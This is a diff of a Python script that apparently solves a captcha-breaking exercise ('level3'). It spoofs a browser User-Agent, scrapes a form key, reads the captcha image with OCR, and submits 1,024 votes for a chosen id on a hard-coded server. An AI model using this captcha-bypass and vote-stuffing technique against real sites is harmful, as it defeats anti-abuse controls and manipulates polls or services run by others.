@@ -15,10 +15,10 @@ agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43"
 # agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) \
 # Gecko/20100101 Firefox/76.0"
-datadic = {'id': '111', 'holdthedoor': 'submit'}
+datadic = {'id': '1345', 'holdthedoor': 'submit'}
 target_url = "http://158.69.76.135/level3.php"
-captchaurl = target_url + "/captcha.png"
-num_votes = 4
+captchaurl = "http://158.69.76.135/captcha.php"
+num_votes = 1024
 reqs_made = 0
 fails = 0
 headers = {'User-Agent': agent, 'Referer': target_url}
@@ -35,11 +35,11 @@ while reqs_made < num_votes and fails < 100:
         datadic["key"] = rxget[0]
 #       print(datadic)
         res = sess.get(captchaurl, headers=headers)
-        with open('captcha.png', 'wb') as file:
-            file.write(res.content)
+        file = open('captcha.png', 'wb')
+        file.write(res.content)
+        file.close()
         datadic["captcha"] = \
             pytesseract.image_to_string(Image.open('captcha.png'))
-        print(datadic)
         res = sess.post(target_url, data=datadic)
         if res.status_code is 200:
             fails = 0
